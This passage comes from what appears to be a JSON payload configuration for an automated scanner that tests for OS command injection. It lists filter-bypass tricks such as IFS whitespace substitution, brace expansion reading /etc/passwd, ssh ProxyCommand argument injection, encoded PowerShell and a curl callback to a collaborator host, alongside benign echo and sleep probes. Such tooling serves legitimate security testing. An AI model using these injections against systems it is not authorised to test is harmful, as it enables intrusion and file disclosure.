{
  "category": "command_injection",
  "craft_guidance": [
    "1. IDENTIFY OS: Linux (uname, $(), |, ;, &&), Windows (cmd.exe, &, |, ^), embedded (busybox subset). Server header, error messages disambiguate.",
    "2. BREAK OUT OF QUOTES: '$(cmd)' inside single quotes = literal. Use \"$(cmd)\" inside double, or break with ';cmd;'.",
    "3. SAFE BENIGN PAYLOADS (Rule 5): id, whoami, hostname, $(echo MARKER) — never `rm`, `shutdown`, `dd`. Verification: `; sleep 5` (timing) or `; curl COLLAB` (Rule 9a).",
    "4. WHITESPACE BYPASS: ${IFS}, $IFS$9, %09 (tab), <, {ls,/}. Bash brace expansion `{cat,/etc/passwd}`.",
    "5. CHARACTER FILTERS: `;` blocked? Try `|`, `&&`, `||`, newline `%0a`, backtick, `$()`. Slash blocked? `${PATH:0:1}` or `${HOME:0:1}` for `/`.",
    "6. BLIND DETECTION: timing (`; sleep 5`), DNS Collaborator (`; nslookup COLLAB`), HTTP Collaborator (`; curl COLLAB`). All ≥3 reps to satisfy Q5 timing rule.",
    "7. DOUBLE-EVAL: input passed to eval-style — `eval`, `system`, `exec`, `passthru`, `popen`, `subprocess.shell=True`. Stack errors leak the wrapper.",
    "8. ARGUMENT INJECTION (no shell): `--config=/etc/passwd`, `-oProxyCommand=...` (ssh), `--upload-file` (curl). No metacharacters needed.",
    "9. WIN: %COMSPEC% /c, dir, type C:\\Windows\\win.ini. PowerShell: `; powershell -e <base64>`.",
    "10. DEMONSTRATE with 1-2 benign markers. PoC > destruction."
  ],
  "contexts": {
    "bash": {
      "description": "OS command injection probes targeting Linux/Unix shell execution via common web stacks",
      "tech_match": [
        "Apache",
        "Nginx",
        "PHP",
        "Flask",
        "Python"
      ],
      "param_match": [
        "cmd",
        "exec",
        "command",
        "ping",
        "ip",
        "host",
        "url",
        "dir",
        "path"
      ],
      "probes": [
        {
          "payload": "{{baseline}}; echo {{marker}}",
          "description": "Semicolon command separator injection — marker in response confirms execution",
          "matchers": [
            {
              "type": "reflection",
              "check_variants": true
            }
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "{{baseline}}| echo {{marker}}",
          "description": "Pipe command injection — marker in response confirms execution",
          "matchers": [
            {
              "type": "reflection",
              "check_variants": true
            }
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "{{baseline}}$(echo {{marker}})",
          "description": "Command substitution injection — marker in response confirms execution",
          "matchers": [
            {
              "type": "reflection",
              "check_variants": true
            }
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "{{baseline}}; sleep {{sleep}}",
          "description": "Time-based blind command injection via sleep",
          "matchers": [
            {
              "type": "timing",
              "min_ms": 4000
            }
          ],
          "severity": "high",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "{{baseline}}`echo {{marker}}`",
          "description": "Backtick command substitution injection",
          "matchers": [
            {
              "type": "reflection",
              "check_variants": true
            }
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        },
        {
          "payload": "{{baseline}} && echo {{marker}}",
          "description": "AND operator command injection — executes only if baseline succeeds",
          "matchers": [
            {
              "type": "reflection",
              "check_variants": true
            }
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        }
      ]
    },
